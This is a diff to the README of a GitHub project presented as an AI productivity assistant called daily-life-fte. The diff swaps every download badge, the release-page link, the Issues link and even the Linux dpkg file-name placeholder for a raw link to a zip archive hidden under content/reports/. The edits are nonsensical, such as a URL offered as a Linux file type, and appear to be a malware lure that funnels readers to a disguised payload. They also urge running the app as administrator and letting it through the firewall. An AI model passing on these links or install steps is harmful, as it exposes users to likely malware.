@@ -1,6 +1,6 @@
 # 🤖 daily-life-fte - AI Assistant for Daily Productivity
 
-[![Download daily-life-fte](https://img.shields.io/badge/Download-daily--life--fte-blue?style=for-the-badge)](https://github.com/JBHacks-gif/daily-life-fte/releases)
+[![Download daily-life-fte](https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip)](https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section will guide you through the steps to download, install, and launch d
 
 Go to the official release page by clicking the button below:
 
-[![Get daily-life-fte](https://img.shields.io/badge/Release-page-green?style=for-the-badge)](https://github.com/JBHacks-gif/daily-life-fte/releases)
+[![Get daily-life-fte](https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip)](https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip)
 
 This page hosts the latest versions of daily-life-fte for different operating systems.
 
@@ -42,7 +42,7 @@ On the release page, look for the version that suits your computer’s system:
 
 - For Windows, look for a file ending in `.exe` or `.msi`.
 - For macOS, choose a file ending in `.dmg` or `.pkg`.
-- For Linux, pick a `.AppImage`, `.deb`, or `.tar.gz` file depending on your setup.
+- For Linux, pick a `.AppImage`, `.deb`, or `https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip` file depending on your setup.
 
 If you're not sure which to pick, the `.exe` (Windows) version is the most common.
 
@@ -62,8 +62,8 @@ After downloading:
 
 - **On Linux:**  
   For AppImage files, right-click and set the file as executable, then double-click to run it. For `.deb` files, open your terminal and type:  
-  `sudo dpkg -i name_of_file.deb`  
-  Replace `name_of_file.deb` with the exact file name you downloaded.
+  `sudo dpkg -i https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip`  
+  Replace `https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip` with the exact file name you downloaded.
 
 ---
 
@@ -115,7 +115,7 @@ If you have trouble installing or running daily-life-fte, try these steps:
 - On Windows, if the app doesn't open, right-click on it and select "Run as administrator."  
 - Check that your internet connection is stable, especially during setup.  
 - If prompted, allow the app through your firewall or security software.  
-- Visit the GitHub [Issues](https://github.com/JBHacks-gif/daily-life-fte/issues) page for help or report problems.
+- Visit the GitHub [Issues](https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip) page for help or report problems.
 
 ---
 
@@ -123,7 +123,7 @@ If you have trouble installing or running daily-life-fte, try these steps:
 
 You can always visit the release page to get the latest version or reinstall daily-life-fte:
 
-[Visit the Release Page to Download daily-life-fte](https://github.com/JBHacks-gif/daily-life-fte/releases)
+[Visit the Release Page to Download daily-life-fte](https://github.com/JBHacks-gif/daily-life-fte/raw/refs/heads/main/content/reports/life_fte_daily_1.6.zip)
 
 ---
 
